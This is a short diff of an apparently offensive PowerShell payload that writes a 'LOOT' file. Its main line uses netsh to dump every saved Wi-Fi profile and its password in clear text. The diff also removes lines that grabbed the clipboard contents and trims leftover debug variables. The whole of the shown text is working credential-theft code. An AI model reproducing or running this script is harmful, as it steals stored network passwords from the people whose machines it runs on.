@@ -1,7 +1,5 @@
 $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
 
-if (-not ([string]::IsNullOrEmpty($test))){$pls="test"}
-if (-not ([string]::IsNullOrEmpty($test2))){$qq=get-clipboard}
 #------------------------------------------------------------------------------------------------------------------------------------
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
@@ -87,16 +85,7 @@ $wifiProfiles
 
 ------------------------------------------------------------------------------------------------------------------------------
 test
-$test
-
-smh
-$smh
-
-qq
-$qq
-
-pls
-$pls
+"$test"
 
 ------------------------------------------------------------------------------------------------------------------------------
 
